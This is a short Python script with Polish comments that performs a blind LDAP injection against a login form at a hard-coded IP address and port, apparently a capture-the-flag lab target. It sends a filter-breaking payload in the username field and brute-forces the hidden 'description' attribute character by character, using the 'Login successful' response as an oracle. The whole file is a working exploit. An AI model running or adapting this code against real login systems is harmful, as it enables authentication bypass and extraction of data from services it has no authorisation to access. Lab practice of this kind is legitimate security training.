import requests

# Funkcja do wysyłania zapytania HTTP
def send_request(description):
    url = 'http://83.136.252.214:35703/index.php'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    payload = "username=admin)(|(description={}*&password=invalid)".format(description)
    #print(payload)
    response = requests.post(url, headers=headers, data=payload)
    #print(response.text)
    return response

# Lista znaków, które chcemy sprawdzić
ascii_characters = ''.join([chr(i) for i in range(128)])
#print(ascii_characters)
valid_chars = ascii_characters

# Pętla po wszystkich znakach
for char in valid_chars:
    response = send_request(char)
    if "Login successful" in response.text:
        print("Znaleziono poprawny znak:", char)
        
        # Pętla po kolejnych znakach
        next_char_pos = 0
        while next_char_pos < len(valid_chars):
            next_char = valid_chars[next_char_pos]
            response = send_request(char + next_char)
            print("Sending request with payload:", char + next_char)  # Wypisywanie każdego zapytania HTTP
            if "Login successful" in response.text:
                print("Znaleziono kolejny poprawny znak:", next_char)
                char += next_char
                next_char_pos = 0
            else:
                next_char_pos += 1
